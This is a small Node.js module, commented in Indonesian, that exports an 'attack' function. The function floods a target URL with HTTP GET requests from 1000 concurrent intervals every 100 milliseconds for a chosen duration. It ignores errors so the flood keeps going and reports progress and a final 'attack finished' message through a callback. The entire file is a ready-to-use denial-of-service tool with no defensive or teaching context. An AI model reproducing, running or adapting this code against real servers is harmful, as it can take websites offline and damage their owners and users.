const axios = require('axios');

function attack(url, duration, callback) {
    let count = 0;
    const threads = 1000;
    const delay = 100;
    const end = Date.now() + duration * 1000;

    // Progress laporan setiap 5 detik
    const progressInterval = setInterval(() => {
        callback(`⏳ Progress: ${count} request terkirim...`);
    }, 5000);

    for (let i = 0; i < threads; i++) {
        const interval = setInterval(async () => {
            if (Date.now() > end) {
                clearInterval(interval);
                return;
            }

            try {
                await axios.get(url);
                count++;
            } catch (err) {
                // Abaikan error agar tetap berjalan
            }
        }, delay);
    }

    setTimeout(() => {
        clearInterval(progressInterval);
        callback(`✅ Serangan selesai! Total request terkirim: ${count}`);
    }, duration * 1000 + 500);
}

module.exports = { attack };